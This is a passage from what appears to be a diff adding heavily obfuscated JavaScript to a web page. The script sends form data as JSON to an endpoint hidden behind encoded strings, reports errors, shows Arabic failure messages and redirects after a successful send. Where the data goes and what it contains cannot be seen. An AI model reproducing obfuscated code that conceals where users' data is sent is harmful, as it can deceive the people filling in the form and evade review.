fetch(_0x5df7ec(0x199),{'method':_0x5df7ec(0x1a1),'headers':{'Content-Type':_0x5df7ec(0x17f)},'body':JSON['stringify'](_0x1f58e5)});document[_0x5df7ec(0x1b0)](_0x5df7ec(0x1b4))['style']['display']=_0x5df7ec(0x173),document[_0x5df7ec(0x1b0)](_0x5df7ec(0x1b5))[_0x5df7ec(0x17c)]=![];const _0x1f6d6b=await _0x1526c3[_0x5df7ec(0x196)]();_0x1f6d6b['success']?(document[_0x5df7ec(0x1b0)](_0x5df7ec(0x1b9))['style'][_0x5df7ec(0x186)]=_0x5df7ec(0x173),document['getElementById'](_0x5df7ec(0x18b))['style'][_0x5df7ec(0x186)]=_0x5df7ec(0x177),setTimeout(()=>{const _0x439d4c=_0x5df7ec;window['location'][_0x439d4c(0x194)]=_0x439d4c(0x18e);},0x9c4)):(sendFailReport(_0x5df7ec(0x1b1),'فشل\x20إرسال\x20البيانات',{'status':_0x1526c3[_0x5df7ec(0x189)],'error':_0x1f6d6b[_0x5df7ec(0x1ae)]||'Unknown'}),alert('حدث\x20خطأ\x20أثناء\x20تنفيذ\x20الطلب.\x20يرجى\x20المحاولة\x20مرة\x20أخرى.'));}catch(_0x12b9ae){console[_0x5df7ec(0x1ae)](_0x5df7ec(0x1b8),_0x12b9ae),document[_0x5df7ec(0x1b0)](_0x5df7ec(0x1b4))[_0x5df7ec(0x185)][_0x5df7ec(0x186)]=_0x5df7ec(0x173),document[_0x5df7ec(0x1b0)]('submitBtn')[_0x5df7ec(0x17c)]=![],sendFailReport('error','خطأ\x20في\x20الاتصال\x20بالخادم',{'error':_0x12b9ae[_0x5df7ec(0x18f)]}),alert(_0x5df7ec(0x18c));}}),window['addEventListener'](_0x263a1a(0x1ae),_0x39a78c=>{const _0x57d098=_0x263a1a;sendFailReport(_0x57d098(0x1ae),_0x57d098(0x198),{'message':_0x39a78c[_0x57d098(0x18f)],'filename':_0x39a78c[_0x57d098(0x1b2)],'lineno':_0x39a78c['lineno']});});
+    </script>
 </body>
 </html>
